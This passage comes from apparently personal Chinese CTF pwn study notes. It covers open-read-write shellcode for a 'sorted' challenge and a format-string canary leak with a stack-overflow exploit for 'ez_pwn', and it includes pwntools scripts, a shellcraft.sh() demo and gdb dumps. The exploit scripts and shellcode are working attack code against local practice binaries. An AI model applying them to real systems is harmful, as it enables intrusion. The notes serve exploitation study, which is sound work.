class=\"number\">7</span>,<span class=\"number\">34</span>,<span class=\"number\">-1</span>,<span class=\"number\">0ll</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">9</span>;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%x&quot;</span>,&amp;DIEnum[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;未排序前结果：\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">9</span>;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,DIEnum[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    std::<span class=\"built_in\">sort</span>(DIEnum,DIEnum+<span class=\"number\">10</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;排序后结果：\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">9</span>;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;0x%-16x          %d\\n&quot;</span>,DIEnum[i],DIEnum[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">     <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;输入的值：\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">9</span>;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,DIEnum[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"二段shellcode\"><a href=\"#二段shellcode\" class=\"headerlink\" title=\"二段shellcode\"></a>二段shellcode</h3><p>这里应该就随意了,生成一个orw的就可以了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置目标架构为x86-64</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># 默认的是大端序，可以修改</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;./flag&quot;</span>)</span><br><span class=\"line\">shellcode += shellcraft.read(<span class=\"string\">&quot;rax&quot;</span>,<span class=\"string\">&quot;rsp&quot;</span>,<span class=\"number\">100</span>)</span><br><span class=\"line\">shellcode += shellcraft.write(<span class=\"number\">1</span>,<span class=\"string\">&quot;rsp&quot;</span>,<span class=\"number\">100</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(asm(shellcode))</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"最终exp\"><a href=\"#最终exp\" class=\"headerlink\" title=\"最终exp\"></a>最终exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># 设置目标架构为x86-64</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># 默认的是大端序，可以修改</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&#x27;./sorted&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&quot;debug&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&#x27;-1869557199 -1862532682 -1862366904 -57622479 -57606351 -53083832 -50592497 -50534657 2147483647 2147483647&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">sc_elf = ELF(&#x27;b.out&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">sc = sc_elf.get_section_by_name(&#x27;.shellcode&#x27;).data()</span></span><br><span class=\"line\"><span class=\"string\">print(sc)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">sc = <span class=\"string\">b&#x27;hflagH\\x89\\xe71\\xd21\\xf6j\\x02X\\x0f\\x05\\x89\\xc71\\xc0j ZH\\x89\\xe6\\x0f\\x05j\\x01_j ZH\\x89\\xe6j\\x01X\\x0f\\x05\\xcc&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">shellcode = shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;./flag&quot;</span>)</span><br><span class=\"line\">shellcode += shellcraft.read(<span class=\"string\">&quot;rax&quot;</span>,<span class=\"string\">&quot;rsp&quot;</span>,<span class=\"number\">100</span>)</span><br><span class=\"line\">shellcode += shellcraft.write(<span class=\"number\">1</span>,<span class=\"string\">&quot;rsp&quot;</span>,<span class=\"number\">100</span>)</span><br><span class=\"line\">io.send(flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0</span>: asm(shellcode),</span><br><span class=\"line\">    <span class=\"number\">0x100</span>: [],</span><br><span class=\"line\">&#125;))</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n<h3 id=\"各种疑惑\"><a href=\"#各种疑惑\" class=\"headerlink\" title=\"各种疑惑\"></a>各种疑惑</h3><p>问: 为什么-490631024 读入内存会成为 0xe2c19090</p>\n<p>答: 负数会采用补码来存储</p>\n<p>问: 为什么前期用python得到的数 输入进去奇奇怪怪</p>\n<p>答:0xfcffffff scanf %d 读取的时候，会解释为负数，所以 不能用python里的直接数值转换来得到题目要输入的值（怪不得前期一直不对。。）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">value = <span class=\"number\">0xfcffffff</span> <span class=\"keyword\">if</span> <span class=\"number\">0xfcffffff</span> &lt; <span class=\"number\">0x80000000</span> <span class=\"keyword\">else</span> <span class=\"number\">0xfcffffff</span> - <span class=\"number\">0x100000000</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(value)</span><br><span class=\"line\">这样就对了</span><br><span class=\"line\"></span><br><span class=\"line\">或者</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"></span><br><span class=\"line\">data = struct.pack(<span class=\"string\">&quot;I&quot;</span>, <span class=\"number\">0xfcffffff</span>)  <span class=\"comment\"># 将无符号整数打包为二进制数据</span></span><br><span class=\"line\">value = struct.unpack(<span class=\"string\">&quot;i&quot;</span>, data)[<span class=\"number\">0</span>]  <span class=\"comment\"># 将二进制数据解析为有符号整数</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(value)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>怎么比较好的在gdb中查看shellcode的汇编呢</p>\n<p>display &#x2F;20i $pc</p>\n<p><a href=\"https://blog.csdn.net/counsellor/article/details/100034080\">https://blog.csdn.net/counsellor/article/details/100034080</a></p>\n<p><a href=\"https://amritabi0s.wordpress.com/2017/10/23/hack-lu-ctf-bit-writeup/\">https://amritabi0s.wordpress.com/2017/10/23/hack-lu-ctf-bit-writeup/</a></p>\n<h3 id=\"pwntools的使用\"><a href=\"#pwntools的使用\" class=\"headerlink\" title=\"pwntools的使用\"></a>pwntools的使用</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置目标架构为x86-64</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># 默认的是大端序，可以修改</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = shellcraft.sh()  <span class=\"comment\"># 指令字符串</span></span><br><span class=\"line\">shellcodeasm = asm(shellcraft.sh()) <span class=\"comment\"># 二进制数据</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用 disasm 函数查看每一行汇编指令的十六进制值</span></span><br><span class=\"line\">disassembled = disasm(shellcodeasm)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 分割每一行汇编指令</span></span><br><span class=\"line\">instructions = disassembled.split(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 打印每一行指令及其十六进制值</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> instruction <span class=\"keyword\">in</span> instructions:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(instruction)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 打印整个shellcode的十六进制值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(shellcodeasm.<span class=\"built_in\">hex</span>())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如何打印指定汇编指令的16进制值</span></span><br><span class=\"line\">assembly_code = <span class=\"string\">&quot;mov eax,0x123&quot;</span></span><br><span class=\"line\">hex_assembly = asm(assembly_code)</span><br><span class=\"line\">hex_assembly_code = asm(assembly_code).<span class=\"built_in\">hex</span>()</span><br><span class=\"line\">hex_assembly_1 = disasm(hex_assembly)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;汇编指令二进制表示: <span class=\"subst\">&#123;hex_assembly&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;汇编指令的十六进制表示: <span class=\"subst\">&#123;hex_assembly_code&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;汇编指令: <span class=\"subst\">&#123;hex_assembly_1&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">##  shellcraft的各种使用方法</span></span><br><span class=\"line\">shellcraft.read()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>pwn asm汇编器</p>\n<p><a href=\"https://leeyuxun.github.io/pwntools%E6%A8%A1%E5%9D%97%E6%80%BB%E7%BB%93.html\">https://leeyuxun.github.io/pwntools%E6%A8%A1%E5%9D%97%E6%80%BB%E7%BB%93.html</a></p>\n<p><a href=\"https://zero-mk.github.io/2019/01/01/pwntools-Command%20Line%20Tools/\">https://zero-mk.github.io/2019/01/01/pwntools-Command%20Line%20Tools/</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwn <span class=\"keyword\">asm</span> <span class=\"string\">&quot;mov eax,0x1&quot;</span></span><br><span class=\"line\">b801000000</span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"ez-pwn\"><a href=\"#ez-pwn\" class=\"headerlink\" title=\"ez_pwn\"></a>ez_pwn</h1><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">32</span>]; <span class=\"comment\">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;input your name&quot;</span>);</span><br><span class=\"line\">  fflush(_bss_start);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;hello: &quot;</span>);</span><br><span class=\"line\">  fflush(_bss_start);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(buf);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;leave some message&quot;</span>);</span><br><span class=\"line\">  fflush(_bss_start);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x48</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t主要是有个canary,把canary泄露出来就可以了,普通栈溢出，利用格式化字符串来泄露canary，注意前六个参数是在寄存器里的值呀。</p>\n<p>​\t然后接收的时候注意先把hello：什么的接收了，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[DEBUG] Received <span class=\"number\">0x10</span> bytes:</span><br><span class=\"line\">    b<span class=\"number\">&#x27;</span>input your name\\n<span class=\"number\">&#x27;</span></span><br><span class=\"line\">[DEBUG] Sent <span class=\"number\">0x6</span> bytes:</span><br><span class=\"line\">    b<span class=\"number\">&#x27;</span>%<span class=\"number\">11</span>$p\\n<span class=\"number\">&#x27;</span></span><br><span class=\"line\">b<span class=\"number\">&#x27;</span>\\n<span class=\"number\">&#x27;</span></span><br><span class=\"line\">[DEBUG] Received <span class=\"number\">0x2e</span> bytes:</span><br><span class=\"line\">    b<span class=\"number\">&#x27;</span>hello: \\n<span class=\"number\">&#x27;</span></span><br><span class=\"line\">    b<span class=\"number\">&#x27;0</span>x2535be38a9253e00\\n<span class=\"number\">&#x27;</span></span><br><span class=\"line\">    b<span class=\"number\">&#x27;l</span>eave some message\\n<span class=\"number\">&#x27;</span></span><br><span class=\"line\">b<span class=\"number\">&#x27;</span>hello: \\n<span class=\"number\">&#x27;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&quot;debug&quot;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;ezpwn&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;name&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p.sendline(b&quot;a&quot;*32)</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;%11$p&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p.recvline())</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p.recvline())</span><br><span class=\"line\">canary = <span class=\"built_in\">int</span>(p.recvline()[:-<span class=\"number\">1</span>],<span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;canary:&quot;</span>,<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;canary:&quot;</span>,canary)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;message&quot;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">40</span> +p64(canary) + p64(<span class=\"number\">0x123456</span>) + p64(<span class=\"number\">0x4012b0</span>)+p64(<span class=\"number\">0x4011d6</span>)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">p.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n<h2 id=\"关于格式化字符串传参：\"><a href=\"#关于格式化字符串传参：\" class=\"headerlink\" title=\"关于格式化字符串传参：\"></a>关于格式化字符串传参：</h2><p>传递10个参数看看</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1:%s 2:%s 3:%s 4:%s 5:%s 6:%s 7:%s 8:%s 9:%s\\n&quot;</span>,<span class=\"string\">&quot;1aaa&quot;</span>,<span class=\"string\">&quot;2bbb&quot;</span>,<span class=\"string\">&quot;3ccc&quot;</span>,<span class=\"string\">&quot;4ddd&quot;</span>,<span class=\"string\">&quot;5eee&quot;</span>,<span class=\"string\">&quot;6fff&quot;</span>,<span class=\"string\">&quot;7ggg&quot;</span>,<span class=\"string\">&quot;8hhh&quot;</span>,<span class=\"string\">&quot;9iii&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\trdi、rsi、rdx、rcx、r8、r9</p>\n<p>​\t可以看到前5个在寄存器,后面在栈里,从rsp开始</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*RAX  <span class=\"number\">0x0</span></span><br><span class=\"line\"> RBX  <span class=\"number\">0x5555555551b0</span> (__libc_csu_init) ◂— endbr64</span><br><span class=\"line\"> RCX  <span class=\"number\">0x555555556012</span> ◂— <span class=\"number\">0x6262320063636333</span> <span class=\"comment\">/* &#x27;3ccc&#x27; */</span></span><br><span class=\"line\"> RDX  <span class=\"number\">0x555555556017</span> ◂— <span class=\"number\">0x6161310062626232</span> <span class=\"comment\">/* &#x27;2bbb&#x27; */</span></span><br><span class=\"line\"> RDI  <span class=\"number\">0x555555556028</span> ◂— <span class=\"string\">&#x27;1:%s 2:%s 3:%s 4:%s 5:%s 6:%s 7:%s 8:%s 9:%s\\n&#x27;</span></span><br><span class=\"line\"> RSI  <span class=\"number\">0x55555555601c</span> ◂— <span class=\"number\">0x61616131</span> <span class=\"comment\">/* &#x27;1aaa&#x27; */</span></span><br><span class=\"line\"> R8   <span class=\"number\">0x55555555600d</span> ◂— <span class=\"number\">0x6363330064646434</span> <span class=\"comment\">/* &#x27;4ddd&#x27; */</span></span><br><span class=\"line\"> R9   <span class=\"number\">0x555555556008</span> ◂— <span class=\"number\">0x6464340065656535</span> <span class=\"comment\">/* &#x27;5eee&#x27; */</span></span><br><span class=\"line\"> R10  <span class=\"number\">0x3</span></span><br><span class=\"line\"> R11  <span class=\"number\">0x0</span></span><br><span class=\"line\"> R12  <span class=\"number\">0x555555555060</span> (_start) ◂— endbr64</span><br><span class=\"line\"> R13  <span class=\"number\">0x7fffffffe5a0</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\"> R14  <span class=\"number\">0x0</span></span><br><span class=\"line\"> R15  <span class=\"number\">0x0</span></span><br><span class=\"line\"> RBP  <span class=\"number\">0x7fffffffe4b0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"> RSP  <span class=\"number\">0x7fffffffe490</span> —▸ <span class=\"number\">0x555555556065</span> ◂— <span class=\"number\">0x100000066666636</span> <span class=\"comment\">/* &#x27;6fff&#x27; */</span></span><br><span class=\"line\">*RIP  <span class=\"number\">0x5555555551a0</span> (main+<span class=\"number\">87</span>) ◂— call <span class=\"number\">0x555555555050</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ rsp <span class=\"number\">0x7fffffffe490</span> —▸ <span class=\"number\">0x555555556065</span> ◂— <span class=\"number\">0x100000066666636</span> <span class=\"comment\">/* &#x27;6fff&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│     <span class=\"number\">0x7fffffffe498</span> —▸ <span class=\"number\">0x555555556060</span> ◂— <span class=\"number\">0x6666360067676737</span> <span class=\"comment\">/* &#x27;7ggg&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│     <span class=\"number\">0x7fffffffe4a0</span> —▸ <span class=\"number\">0x55555555605b</span> ◂— <span class=\"number\">0x6767370068686838</span> <span class=\"comment\">/* &#x27;8hhh&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>│     <span class=\"number\">0x7fffffffe4a8</span> —▸ <span class=\"number\">0x555555556056</span> ◂— <span class=\"number\">0x6868380069696939</span> <span class=\"comment\">/* &#x27;9iii&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│ rbp <span class=\"number\">0x7fffffffe4b0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│     <span class=\"number\">0x7fffffffe4b8</span> —▸ <span class=\"number\">0x7ffff7de4083</span> (__libc_start_main+<span class=\"number\">243</span>) ◂— mov edi, eax</span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0030</span>│     <span class=\"number\">0x7fffffffe4c0</span> —▸ <span class=\"number\">0x7ffff7ffc620</span> (_rtld_global_ro) ◂— <span class=\"number\">0x50f7a00000000</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">0038</span>│     <span class=\"number\">0x7fffffffe4c8</span> —▸ <span class=\"number\">0x7fffffffe5a8</span> —▸ <span class=\"number\">0x7fffffffe7f4</span> ◂— <span class=\"string\">&#x27;/home/ubuntu/c/a.out&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><p>类似的题</p>\n<p><a href=\"https://blog.csdn.net/tbsqigongzi/article/details/124371294\">https://blog.csdn.net/tbsqigongzi/article/details/124371294</a></p>\n<p>这个为什么进入ret了,但是失败了? ret栈平衡?</p>\n<p>  fflush(_bss_start);有什么用呢</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
